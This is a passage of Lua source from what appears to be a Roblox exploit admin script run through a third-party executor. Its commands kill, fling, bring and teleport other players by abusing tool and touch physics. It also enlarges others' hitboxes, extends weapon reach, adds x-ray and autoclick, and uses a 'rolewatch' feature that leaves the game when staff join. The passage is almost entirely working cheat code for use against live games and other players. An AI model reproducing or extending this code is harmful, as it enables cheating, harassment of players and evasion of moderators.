		local OrigPos = speaker.Character.HumanoidRootPart.Position
		local Tools, TempPos = {}, Vector3.new(math.random(-2e5, 2e5), 2e5, math.random(-2e5, 2e5))
		for i = 1, LOOP_NUM do
			local Human = speaker.Character:WaitForChild("Humanoid")
			wait(.1, Human.Parent:MoveTo(TempPos))
			Human.RootPart.Anchored = speaker:ClearCharacterAppearance(wait(.1)) or true
			local t = GetHandleTools(speaker)
			while #t > 0 do
				for _, v in ipairs(t) do
					task.spawn(function()
						for _ = 1, 25 do
							v.Parent = speaker.Character
							v.Handle.Anchored = true
						end
						for _ = 1, 5 do
							v.Parent = workspace
						end
						table.insert(Tools, v.Handle)
					end)
				end
				t = GetHandleTools(speaker)
			end
			wait(.1)
			speaker.Character = speaker.Character:Destroy()
			speaker.CharacterAdded:Wait():WaitForChild("Humanoid").Parent:MoveTo(LOOP_NUM == i and OrigPos or TempPos, wait(.1))
			if i == LOOP_NUM or i % 5 == 0 then
				local HRP = speaker.Character.HumanoidRootPart
				if type(firetouchinterest) == "function" then
					for _, v in ipairs(Tools) do
						v.Anchored = not firetouchinterest(v, HRP, 1, firetouchinterest(v, HRP, 0)) and false or false
					end
				else
					for _, v in ipairs(Tools) do
						task.spawn(function()
							local x = v.CanCollide
							v.CanCollide = false
							v.Anchored = false
							for _ = 1, 10 do
								v.CFrame = HRP.CFrame
								wait()
							end
							v.CanCollide = x
						end)
					end
				end
				wait(.1)
				Tools = {}
			end
			TempPos = TempPos + Vector3.new(10, math.random(-5, 5), 0)
		end
	end)

	local RS = RunService.RenderStepped
	addcmd('givetool', {'givetools'}, function(args, speaker)
		local a = getPlayer(args[1], speaker)[1]
		local v = Players[a].Character
		workspace.CurrentCamera.CameraSubject = v
		local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
		local hum = Char and Char:FindFirstChildWhichIsA('Humanoid')
		local hrp = hum and hum.RootPart
		local hrppos = hrp.CFrame
		hum = hum:Destroy() or hum:Clone()
		hum.Parent = Char
		hum:ClearAllChildren()
		speaker:ClearCharacterAppearance()
		task.spawn(function()
			speaker.CharacterAdded:Wait():WaitForChild('Humanoid').RootPart.CFrame = wait() and hrppos
		end)
		local vHRP = getRoot(v)
		while Char and Char.Parent and vHRP and vHRP.Parent do
			local Tools = false
			for _, v in ipairs(Char:GetChildren()) do
				if v:IsA('BackpackItem') and v:FindFirstChild('Handle') then
					Tools = true
					firetouchinterest(v.Handle, vHRP, 0)
					firetouchinterest(v.Handle, vHRP, 1)
				end
			end
			if not Tools then
				break
			end
			hrp.CFrame = vHRP.CFrame
			RS:Wait()
		end
		execCmd('re')
	end)

	addcmd('touchinterests', {'touchinterest', 'firetouchinterests', 'firetouchinterest'}, function(args, speaker)
		if not firetouchinterest then
			notify("Incompatible Exploit", "Your exploit does not support this command (missing firetouchinterest)")
			return
		end

		local root = getRoot(speaker.Character) or speaker.Character:FindFirstChildWhichIsA("BasePart")

		local function touch(x)
			x = x:FindFirstAncestorWhichIsA("Part")
			if x then
				if firetouchinterest then
					task.spawn(function()
						firetouchinterest(x, root, 1)
						wait()
						firetouchinterest(x, root, 0)
					end)
				end
				x.CFrame = root.CFrame
			end
		end

		if args[1] then
			local name = getstring(1)
			for _, descendant in ipairs(workspace:GetDescendants()) do
				if descendant:IsA("TouchTransmitter") and descendant.Name == name then
					touch(descendant)
				end
			end
		else
			for _, descendant in ipairs(workspace:GetDescendants()) do
				if descendant:IsA("TouchTransmitter") then
					touch(descendant)
				end
			end
		end
	end)

	addcmd('fullbright',{'fb','fullbrightness'},function(args, speaker)
		Lighting.Brightness = 2
		Lighting.ClockTime = 14
		Lighting.FogEnd = 100000
		Lighting.GlobalShadows = false
		Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
	end)

	addcmd('loopfullbright',{'loopfb'},function(args, speaker)
		if brightLoop then
			brightLoop:Disconnect()
		end
		local function brightFunc()
			Lighting.Brightness = 2
			Lighting.ClockTime = 14
			Lighting.FogEnd = 100000
			Lighting.GlobalShadows = false
			Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end

		brightLoop = RunService.RenderStepped:Connect(brightFunc)
	end)

	addcmd('unloopfullbright',{'unloopfb'},function(args, speaker)
		if brightLoop then
			brightLoop:Disconnect()
		end
	end)

	addcmd('ambient',{},function(args, speaker)
		Lighting.Ambient = Color3.new(args[1],args[2],args[3])
		Lighting.OutdoorAmbient = Color3.new(args[1],args[2],args[3])
	end)

	addcmd('day',{},function(args, speaker)
		Lighting.ClockTime = 14
	end)

	addcmd('night',{},function(args, speaker)
		Lighting.ClockTime = 0
	end)

	addcmd('nofog',{},function(args, speaker)
		Lighting.FogEnd = 100000
		for i,v in pairs(Lighting:GetDescendants()) do
			if v:IsA("Atmosphere") then
				v:Destroy()
			end
		end
	end)

	addcmd('brightness',{},function(args, speaker)
		Lighting.Brightness = args[1]
	end)

	addcmd('globalshadows',{'gshadows'},function(args, speaker)
		Lighting.GlobalShadows = true
	end)

	addcmd('unglobalshadows',{'nogshadows','ungshadows','noglobalshadows'},function(args, speaker)
		Lighting.GlobalShadows = false
	end)

	origsettings = {abt = Lighting.Ambient, oabt = Lighting.OutdoorAmbient, brt = Lighting.Brightness, time = Lighting.ClockTime, fe = Lighting.FogEnd, fs = Lighting.FogStart, gs = Lighting.GlobalShadows}

	addcmd('restorelighting',{'rlighting'},function(args, speaker)
		Lighting.Ambient = origsettings.abt
		Lighting.OutdoorAmbient = origsettings.oabt
		Lighting.Brightness = origsettings.brt
		Lighting.ClockTime = origsettings.time
		Lighting.FogEnd = origsettings.fe
		Lighting.FogStart = origsettings.fs
		Lighting.GlobalShadows = origsettings.gs
	end)

	addcmd('stun',{'platformstand'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
	end)

	addcmd('unstun',{'nostun','unplatformstand','noplatformstand'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end)

	addcmd('norotate',{'noautorotate'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = false
	end)

	addcmd('unnorotate',{'autorotate'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = true
	end)

	addcmd('enablestate',{},function(args, speaker)
		local x = args[1]
		if not tonumber(x) then
			local d = args[1]
			local x = Enum.HumanoidStateType[d]
		end
		speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, true)
	end)

	addcmd('disablestate',{},function(args, speaker)
		local x = args[1]
		if not tonumber(x) then
			local d = args[1]
			local x = Enum.HumanoidStateType[d]
		end
		speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, false)
	end)

	addcmd('drophats',{'drophat'},function(args, speaker)
		if speaker.Character then
			for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
				v.Parent = workspace
			end
		end
	end)

	addcmd('deletehats',{'nohats','rhats'},function(args, speaker)
		for i,v in next, speaker.Character:GetDescendants() do
			if v:IsA("Accessory") then
				for i,p in next, v:GetDescendants() do
					if p:IsA("Weld") then
						p:Destroy()
					end
				end
			end
		end
	end)

	addcmd('droptools',{'droptool'},function(args, speaker)
		for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
			if v:IsA("Tool") then
				v.Parent = Players.LocalPlayer.Character
			end
		end
		wait()
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then
				v.Parent = workspace
			end
		end
	end)

	addcmd('droppabletools',{},function(args, speaker)
		if speaker.Character then
			for _,obj in pairs(speaker.Character:GetChildren()) do
				if obj:IsA("Tool") then
					obj.CanBeDropped = true
				end
			end
		end
		if speaker:FindFirstChildOfClass("Backpack") then
			for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
				if obj:IsA("Tool") then
					obj.CanBeDropped = true
				end
			end
		end
	end)

	local currentToolSize = ""
	local currentGripPos = ""
	addcmd('reach',{},function(args, speaker)
		execCmd('unreach')
		wait()
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				if args[1] then
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(0.5,0.5,args[1])
					v.GripPos = Vector3.new(0,0,0)
					speaker.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
				else
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(0.5,0.5,60)
					v.GripPos = Vector3.new(0,0,0)
					speaker.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
				end
			end
		end
	end)

	addcmd('unreach',{'noreach'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Handle.Size = currentToolSize
				v.GripPos = currentGripPos
				v.Handle.SelectionBoxCreated:Destroy()
			end
		end
	end)

	addcmd('grippos',{},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = speaker:FindFirstChildOfClass("Backpack")
				v.GripPos = Vector3.new(args[1],args[2],args[3])
				v.Parent = speaker.Character
			end
		end
	end)

	addcmd('usetools', {}, function(args, speaker)
		local Backpack = speaker:FindFirstChildOfClass("Backpack")
		local ammount = tonumber(args[1]) or 1
		local delay_ = tonumber(args[2]) or false
		for _, v in ipairs(Backpack:GetChildren()) do
			v.Parent = speaker.Character
			task.spawn(function()
				for _ = 1, ammount do
					v:Activate()
					if delay_ then
						wait(delay_)
					end
				end
				v.Parent = Backpack
			end)
		end
	end)

	addcmd('logs',{},function(args, speaker)
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	addcmd('chatlogs',{'clogs'},function(args, speaker)
		join.Visible = false
		chat.Visible = true
		table.remove(shade3,table.find(shade3,selectChat))
		table.remove(shade2,table.find(shade2,selectJoin))
		table.insert(shade2,selectChat)
		table.insert(shade3,selectJoin)
		selectJoin.BackgroundColor3 = currentShade3
		selectChat.BackgroundColor3 = currentShade2
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	addcmd('joinlogs',{'jlogs'},function(args, speaker)
		chat.Visible = false
		join.Visible = true	
		table.remove(shade3,table.find(shade3,selectJoin))
		table.remove(shade2,table.find(shade2,selectChat))
		table.insert(shade2,selectJoin)
		table.insert(shade3,selectChat)
		selectChat.BackgroundColor3 = currentShade3
		selectJoin.BackgroundColor3 = currentShade2
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	flinging = false
	addcmd('fling',{},function(args, speaker)
		flinging = false
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child:IsA("BasePart") then
				child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, 0.3, 0.5)
			end
		end
		execCmd('noclip')
		wait(.1)
		local bambam = Instance.new("BodyAngularVelocity")
		bambam.Name = randomString()
		bambam.Parent = getRoot(speaker.Character)
		bambam.AngularVelocity = Vector3.new(0,99999,0)
		bambam.MaxTorque = Vector3.new(0,math.huge,0)
		bambam.P = math.huge
		local Char = speaker.Character:GetChildren()
		for i, v in next, Char do
			if v:IsA("BasePart") then
				v.CanCollide = false
				v.Massless = true
				v.Velocity = Vector3.new(0, 0, 0)
			end
		end
		flinging = true
		local function flingDiedF()
			execCmd('unfling')
		end
		flingDied = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDiedF)
		repeat
			bambam.AngularVelocity = Vector3.new(0,99999,0)
			wait(.2)
			bambam.AngularVelocity = Vector3.new(0,0,0)
			wait(.1)
		until flinging == false
	end)

	addcmd('unfling',{'nofling'},function(args, speaker)
		execCmd('clip')
		if flingDied then
			flingDied:Disconnect()
		end
		flinging = false
		wait(.1)
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		for i,v in pairs(getRoot(speakerChar):GetChildren()) do
			if v.ClassName == 'BodyAngularVelocity' then
				v:Destroy()
			end
		end
		for _, child in pairs(speakerChar:GetDescendants()) do
			if child.ClassName == "Part" or child.ClassName == "MeshPart" then
				child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
	end)

	addcmd('togglefling',{},function(args, speaker)
		if flinging then
			execCmd('unfling')
		else
			execCmd('fling')
		end
	end)

	addcmd('invisfling',{},function(args, speaker)
		local ch = speaker.Character
		local prt=Instance.new("Model")
		prt.Parent = speaker.Character
		local z1 = Instance.new("Part")
		z1.Name="Torso"
		z1.CanCollide = false
		z1.Anchored = true
		local z2 = Instance.new("Part")
		z2.Name="Head"
		z2.Parent = prt
		z2.Anchored = true
		z2.CanCollide = false
		local z3 =Instance.new("Humanoid")
		z3.Name="Humanoid"
		z3.Parent = prt
		z1.Position = Vector3.new(0,9999,0)
		speaker.Character=prt
		wait(3)
		speaker.Character=ch
		wait(3)
		local Hum = Instance.new("Humanoid")
		z2:Clone()
		Hum.Parent = speaker.Character
		local root =  getRoot(speaker.Character)
		for i,v in pairs(speaker.Character:GetChildren()) do
			if v ~= root and  v.Name ~= "Humanoid" then
				v:Destroy()
			end
		end
		root.Transparency = 0
		root.Color = Color3.new(1, 1, 1)
		local invisflingStepped
		invisflingStepped = RunService.Stepped:Connect(function()
			if speaker.Character and getRoot(speaker.Character) then
				getRoot(speaker.Character).CanCollide = false
			else
				invisflingStepped:Disconnect()
			end
		end)
		sFLY()
		workspace.CurrentCamera.CameraSubject = root
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = getRoot(speaker.Character)
		bambam.Force = Vector3.new(99999,99999*10,99999)
		bambam.Location = getRoot(speaker.Character).Position
	end)

	function attach(speaker,target)
		if tools(speaker) then
			local char = speaker.Character
			local tchar = target.Character
			local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
			local hrp = getRoot(speaker.Character)
			local hrp2 = getRoot(target.Character)
			hum.Name = "1"
			local newHum = hum:Clone()
			newHum.Parent = char
			newHum.Name = "Humanoid"
			wait()
			hum:Destroy()
			workspace.CurrentCamera.CameraSubject = char
			newHum.DisplayDistanceType = "None"
			local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
			tool.Parent = char
			hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
			local n = 0
			repeat
				wait(.1)
				n = n + 1
				hrp.CFrame = hrp2.CFrame
			until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('attach',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			attach(speaker,Players[v])
		end
	end)

	function kill(speaker,target,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5,999999)
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('kill',{'fekill'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			kill(speaker,Players[v])
		end
	end)

	addcmd('handlekill', {'hkill'}, function(args, speaker)
		if not firetouchinterest then
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing firetouchinterest)')
		end
		local RS = RunService.RenderStepped
		local Tool = speaker.Character.FindFirstChildWhichIsA(speaker.Character, "Tool")
		local Handle = Tool and Tool.FindFirstChild(Tool, "Handle")
		if not Tool or not Handle then
			return notify("Handle Kill", "You need to hold a \"Tool\" that does damage on touch. For example the default \"Sword\" tool.")
		end
		for _, v in ipairs(getPlayer(args[1], speaker)) do
			v = Players[v]
			task.spawn(function()
				while Tool and speaker.Character and v.Character and Tool.Parent == speaker.Character do
					local Human = v.Character.FindFirstChildWhichIsA(v.Character, "Humanoid")
					if not Human or Human.Health <= 0 then
						break
					end
					for _, v1 in ipairs(v.Character.GetChildren(v.Character)) do
						v1 = ((v1.IsA(v1, "BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
					end
				end
				notify("Handle Kill Stopped!", v.Name .. " died/left or you unequipped the tool!")
			end)
		end
	end)

	local hb = RunService.Heartbeat
	addcmd('tpwalk', {'teleportwalk'}, function(args, speaker)
		tpwalking = true
		local chr = speaker.Character
		local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
		while tpwalking and chr and hum and hum.Parent do
			local delta = hb:Wait()
			if hum.MoveDirection.Magnitude > 0 then
				if args[1] and isNumber(args[1]) then
					chr:TranslateBy(hum.MoveDirection * tonumber(args[1]) * delta * 10)
				else
					chr:TranslateBy(hum.MoveDirection * delta * 10)
				end
			end
		end
	end)
	addcmd('untpwalk', {'unteleportwalk'}, function(args, speaker)
		tpwalking = false
	end)

	addcmd('fastkill',{'fastfekill'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			kill(speaker,Players[v],true)
		end
	end)

	function bring(speaker,target,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = NormPos
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('bring',{'febring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			bring(speaker,Players[v])
		end
	end)

	addcmd('fastbring',{'fastfebring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			bring(speaker,Players[v],true)
		end
	end)

	function teleport(speaker,target,target2,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				local hrp2 = getRoot(target2.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = hrp2.CFrame
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				wait(1)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('tp',{'teleport'},function(args, speaker)
		local players1=getPlayer(args[1], speaker)
		local players2=getPlayer(args[2], speaker)
		for i,v in pairs(players1)do
			local c = players2[1]
			if getRoot(Players[v].Character) and getRoot(Players[c].Character) then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				teleport(speaker,Players[v],Players[c])
			end
		end
	end)

	addcmd('fasttp',{'fastteleport'},function(args, speaker)
		local players1=getPlayer(args[1], speaker)
		local players2=getPlayer(args[2], speaker)
		for i,v in pairs(players1)do
			local c = players2[1]
			if getRoot(Players[v].Character) and getRoot(Players[c].Character) then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				teleport(speaker,Players[v],Players[c],true)
			end
		end
	end)

	addcmd('spin',{},function(args, speaker)
		local spinSpeed = 20
		if args[1] and isNumber(args[1]) then
			spinSpeed = args[1]
		end
		for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
		local Spin = Instance.new("BodyAngularVelocity")
		Spin.Name = "Spinning"
		Spin.Parent = getRoot(speaker.Character)
		Spin.MaxTorque = Vector3.new(0, math.huge, 0)
		Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
	end)

	addcmd('unspin',{},function(args, speaker)
		for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
	end)

	local transparent = false
	function x(v)
		if v then
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA("BasePart") and not i.Parent:FindFirstChildOfClass('Humanoid') and not i.Parent.Parent:FindFirstChildOfClass('Humanoid') then
					i.LocalTransparencyModifier = 0.5
				end
			end
		else
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA("BasePart") and not i.Parent:FindFirstChildOfClass('Humanoid') and not i.Parent.Parent:FindFirstChildOfClass('Humanoid') then
					i.LocalTransparencyModifier = 0
				end
			end
		end
	end

	addcmd('xray',{},function(args, speaker)
		transparent = true
		x(transparent)
	end)

	addcmd('unxray',{'noxray'},function(args, speaker)
		transparent = false
		x(transparent)
	end)

	addcmd('togglexray',{},function(args, speaker)
		transparent=not transparent
		x(transparent)
	end)

	local walltpTouch = nil
	addcmd('walltp',{},function(args, speaker)
		local torso
		if r15(speaker) then
			torso = speaker.Character.UpperTorso
		else
			torso = speaker.Character.Torso
		end
		local function touchedFunc(hit)
			local Root = getRoot(speaker.Character)
			if hit:IsA("BasePart") and hit.Position.Y > Root.Position.Y - speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight then
				local hitP = getRoot(hit.Parent)
				if hitP ~= nil then
					Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hitP.Size.Z/2 + speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight,Root.CFrame.lookVector.Z)
				elseif hitP == nil then
					Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hit.Size.Y/2 + speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight,Root.CFrame.lookVector.Z)
				end
			end
		end
		walltpTouch = torso.Touched:Connect(touchedFunc)
	end)

	addcmd('unwalltp',{'nowalltp'},function(args, speaker)
		if walltpTouch then
			walltpTouch:Disconnect()
		end
	end)

	autoclicking = false
	addcmd('autoclick',{},function(args, speaker)
		if mouse1press and mouse1release then
			execCmd('unautoclick')
			wait()
			local clickDelay = 0.1
			local releaseDelay = 0.1
			if args[1] and isNumber(args[1]) then clickDelay = args[1] end
			if args[2] and isNumber(args[2]) then releaseDelay = args[2] end
			autoclicking = true
			cancelAutoClick = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
						autoclicking = false
						cancelAutoClick:Disconnect()
					end
				end
			end)
			notify('Auto Clicker',"Press [backspace] and [=] at the same time to stop")
			repeat wait(clickDelay)
				mouse1press()
				wait(releaseDelay)
				mouse1release()
			until autoclicking == false
		else
			notify('Auto Clicker',"Your exploit doesn't have the ability to use the autoclick")
		end
	end)

	addcmd('unautoclick',{'noautoclick'},function(args, speaker)
		autoclicking = false
		if cancelAutoClick then cancelAutoClick:Disconnect() end
	end)

	addcmd('mousesensitivity',{'ms'},function(args, speaker)
		UserInputService.MouseDeltaSensitivity = args[1]
	end)

	local nameBox = nil
	local nbSelection = nil
	addcmd('hovername',{},function(args, speaker)
		execCmd('unhovername')
		wait()
		nameBox = Instance.new("TextLabel")
		nameBox.Name = randomString()
		nameBox.Parent = PARENT
		nameBox.BackgroundTransparency = 1
		nameBox.Size = UDim2.new(0,200,0,30)
		nameBox.Font = Enum.Font.Code
		nameBox.TextSize = 16
		nameBox.Text = ""
		nameBox.TextColor3 = Color3.new(1, 1, 1)
		nameBox.TextStrokeTransparency = 0
		nameBox.TextXAlignment = Enum.TextXAlignment.Left
		nameBox.ZIndex = 10
		nbSelection = Instance.new('SelectionBox')
		nbSelection.Name = randomString()
		nbSelection.LineThickness = 0.03
		nbSelection.Color3 = Color3.new(1, 1, 1)
		local function updateNameBox()
			local t
			local target = IYMouse.Target

			if target then
				local humanoid = target.Parent:FindFirstChildOfClass("Humanoid") or target.Parent.Parent:FindFirstChildOfClass("Humanoid")
				if humanoid then
					t = humanoid.Parent
				end
			end

			if t ~= nil then
				local x = IYMouse.X
				local y = IYMouse.Y
				local xP
				local yP
				if IYMouse.X > 200 then
					xP = x - 205
					nameBox.TextXAlignment = Enum.TextXAlignment.Right
				else
					xP = x + 25
					nameBox.TextXAlignment = Enum.TextXAlignment.Left
				end
				nameBox.Position = UDim2.new(0, xP, 0, y)
				nameBox.Text = t.Name
				nameBox.Visible = true
				nbSelection.Parent = t
				nbSelection.Adornee = t
			else
				nameBox.Visible = false
				nbSelection.Parent = nil
				nbSelection.Adornee = nil
			end
		end
		nbUpdateFunc = IYMouse.Move:Connect(updateNameBox)
	end)

	addcmd('unhovername',{'nohovername'},function(args, speaker)
		if nbUpdateFunc then
			nbUpdateFunc:Disconnect()
			nameBox:Destroy()
			nbSelection:Destroy()
		end
	end)

	addcmd('headsize',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if Players[v] ~= speaker and Players[v].Character:FindFirstChild('Head') then
				local sizeArg = tonumber(args[2])
				local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
				local Head = Players[v].Character:FindFirstChild('Head')
				if Head:IsA("BasePart") then
					if not args[2] or sizeArg == 1 then
						Head.Size = Vector3.new(2,1,1)
					else
						Head.Size = Size
					end
				end
			end
		end
	end)

	addcmd('hitbox',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if Players[v] ~= speaker and Players[v].Character:FindFirstChild('HumanoidRootPart') then
				local sizeArg = tonumber(args[2])
				local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
				local Root = Players[v].Character:FindFirstChild('HumanoidRootPart')
				if Root:IsA("BasePart") then
					if not args[2] or sizeArg == 1 then
						Root.Size = Vector3.new(2,1,1)
						Root.Transparency = 0.4
					else
						Root.Size = Size
						Root.Transparency = 0.4
					end
				end
			end
		end
	end)

	addcmd('stareat',{'stare'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if stareLoop then
				stareLoop:Disconnect()
			end
			if not Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and Players[v].Character:FindFirstChild("HumanoidRootPart") then return end
			local function stareFunc()
				if Players.LocalPlayer.Character.PrimaryPart and Players:FindFirstChild(v) and Players[v].Character ~= nil and Players[v].Character:FindFirstChild("HumanoidRootPart") then
					local chrPos=Players.LocalPlayer.Character.PrimaryPart.Position
					local tPos=Players[v].Character:FindFirstChild("HumanoidRootPart").Position
					local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
					local newCF=CFrame.new(chrPos,modTPos)
					Players.LocalPlayer.Character:SetPrimaryPartCFrame(newCF)
				elseif not Players:FindFirstChild(v) then
					stareLoop:Disconnect()
				end
			end

			stareLoop = RunService.RenderStepped:Connect(stareFunc)
		end
	end)

	addcmd('unstareat',{'unstare','nostare','nostareat'},function(args, speaker)
		if stareLoop then
			stareLoop:Disconnect()
		end
	end)

	local RolewatchData = {["Group"]=0,["Role"]="",["Leave"]=false}
	local RolewatchConnection = Players.PlayerAdded:Connect(function(player)
		if RolewatchData.Group == 0 then return end
		if player:IsInGroup(RolewatchData.Group) then
			if tostring(player:GetRoleInGroup(RolewatchData.Group)):lower() == RolewatchData.Role:lower() then
				if RolewatchData.Leave == true then
					Players.LocalPlayer:Kick("\n\nRolewatch\nPlayer \"" .. tostring(player.Name) .. "\" has joined with the Role \"" .. RolewatchData.Role .. "\"\n")
				else
					notify("Rolewatch", "Player \"" .. tostring(player.Name) .. "\" has joined with the Role \"" .. RolewatchData.Role .. "\"")
				end
			end
		end
	end)

	addcmd('rolewatch',{},function(args, speaker)
		local groupid = args[1] or 0
		if isNumber(groupid) then
			if args[2] then
				local rolename = tostring(getstring(2))
				RolewatchData.Group = tonumber(groupid)
				RolewatchData.Role = rolename
				notify("Rolewatch", "Watching Group ID \"" .. tostring(groupid) .. "\" for Role \"" .. rolename .. "\"")
			end
		end
	end)

	addcmd('rolewatchstop',{},function(args, speaker)
		RolewatchData = {["Group"]=0,["Role"]="",["Leave"]=false}
	end)

	addcmd('rolewatchleave',{'unrolewatch'},function(args, speaker)
		RolewatchData.Leave = not RolewatchData.Leave
		notify("Rolewatch", RolewatchData.Leave and "Leave has been Enabled" or "Leave has been Disabled")
	end)

	addcmd('removeterrain',{'rterrain','noterrain'},function(args, speaker)
		workspace:FindFirstChildOfClass('Terrain'):Clear()
	end)

	addcmd('clearnilinstances',{'nonilinstances','cni'},function(args, speaker)
		if getnilinstances then
			for i,v in pairs(getnilinstances()) do
				v:Destroy()
			end
